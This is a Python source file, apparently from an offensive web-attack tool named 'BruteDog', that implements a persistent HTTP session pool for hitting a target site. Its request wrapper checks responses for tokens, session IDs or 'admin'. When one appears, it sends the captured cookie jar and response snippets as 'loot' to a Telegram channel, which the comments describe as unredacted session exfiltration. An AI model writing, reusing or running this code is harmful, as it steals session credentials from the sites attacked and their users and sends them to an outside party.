import httpx
import logging
from typing import Dict, Any, Optional, Union

# Import centralized Telegram broadcaster for unredacted session exfiltration
from modules.telegram_notifier import send_telegram_alert

logger = logging.getLogger("BruteDog.SessionPool")

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
    try:
        import asyncio
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            import asyncio
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

class PersistentSessionPool:
    """
    Manages persistent sessions, cookie jars, and headers across HTTP/2 multiplexed 
    requests to prevent session drops during high-concurrency race conditions.
    Weaponized with automatic CSRF synchronization, wrapper request handlers, 
    and real-time Telegram telemetry broadcasting.
    """
    def __init__(self, base_url: str, verify_ssl: bool = False, http2: bool = True):
        self.base_url = base_url.rstrip("/")
        self.verify_ssl = verify_ssl
        self.http2 = http2
        
        # Initialize a shared cookie jar and headers
        self.cookie_jar = httpx.Cookies()
        self.default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest"
        }
        logger.info(f"[+] Initialized PersistentSessionPool for target: {self.base_url} (HTTP/2: {self.http2})")

    def update_headers(self, new_headers: Dict[str, str]) -> None:
        """Dynamically update default headers (e.g., Authorization Bearer tokens or CSRF tokens)."""
        self.default_headers.update(new_headers)
        logger.debug(f"[+] Session headers updated: list of keys -> {list(new_headers.keys())}")

    def set_csrf_token(self, token: str) -> None:
        """Automatically injects CSRF tokens into standard framework header keys."""
        if token:
            self.update_headers({
                "X-CSRF-TOKEN": token,
                "X-XSRF-TOKEN": token
            })
            logger.debug(f"[+] CSRF tokens synchronized into session headers.")

    def get_client(self, timeout: float = 10.0) -> httpx.Client:
        """Returns a synchronous httpx.Client sharing the persistent cookie jar."""
        return httpx.Client(
            base_url=self.base_url,
            cookies=self.cookie_jar,
            headers=self.default_headers,
            verify=self.verify_ssl,
            http2=self.http2,
            timeout=timeout,
            follow_redirects=True
        )

    def get_async_client(self, timeout: float = 10.0) -> httpx.AsyncClient:
        """Returns an asynchronous httpx.AsyncClient sharing the persistent cookie jar and HTTP/2 settings."""
        return httpx.AsyncClient(
            base_url=self.base_url,
            cookies=self.cookie_jar,
            headers=self.default_headers,
            verify=self.verify_ssl,
            http2=self.http2,
            timeout=timeout,
            follow_redirects=True
        )

    def sync_cookies(self, response_cookies: Union[httpx.Cookies, dict, str]) -> None:
        """Manually synchronize external cookie responses into the master jar safely, handling strings/dicts."""
        try:
            if isinstance(response_cookies, str):
                for cookie_pair in response_cookies.split(";"):
                    if "=" in cookie_pair:
                        k, v = cookie_pair.strip().split("=", 1)
                        self.cookie_jar.set(k, v)
            elif isinstance(response_cookies, dict):
                for k, v in response_cookies.items():
                    self.cookie_jar.set(k, v)
            elif hasattr(response_cookies, "items"):
                for k, v in response_cookies.items():
                    self.cookie_jar.set(k, v)
            else:
                self.cookie_jar.update(response_cookies)
            
            logger.debug("[+] Cookie jar synchronized with latest response cookies.")
        except Exception as exc:
            logger.error(f"[-] Failed to synchronize cookies: {exc}")

    def request(self, method: str, path: str, payload: Optional[Dict[str, Any]] = None, timeout: float = 10.0) -> tuple:
        """
        Unified wrapper method used by crawlers and assessment engines to fire requests 
        while auto-syncing cookies and returning standardized (status, headers, body) tuples.
        """
        clean_path = path if path.startswith("/") else f"/{path}"
        url = clean_path if clean_path.startswith("http") else clean_path
        
        with self.get_client(timeout=timeout) as client:
            try:
                if method.upper() == "POST":
                    if payload and any(isinstance(v, (dict, list)) for v in payload.values()):
                        resp = client.post(url, json=payload)
                    else:
                        resp = client.post(url, data=payload)
                elif method.upper() == "PUT":
                    resp = client.put(url, json=payload)
                else:
                    resp = client.get(url)

                # Automatically synchronize any new cookies returned by the server
                if resp.cookies:
                    self.cookie_jar.update(resp.cookies)

                set_cookie = resp.headers.get("set-cookie") or resp.headers.get("Set-Cookie")
                if set_cookie:
                    self.sync_cookies(set_cookie)

                # Check for high-value authentication or session leakage in response
                body_lower = resp.text.lower()
                if resp.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
                    session_loot = {
                        "url": f"{self.base_url}{url}",
                        "status": resp.status_code,
                        "cookies": dict(self.cookie_jar),
                        "response_snippet": resp.text[:300]
                    }
                    broadcast_tg_alert_sync("Session Pool Loot Captured", session_loot)

                return resp.status_code, dict(resp.headers), resp.text
            except Exception as e:
                logger.error(f"[-] Request failed for {method} {url}: {e}")
                return 0, {}, str(e)
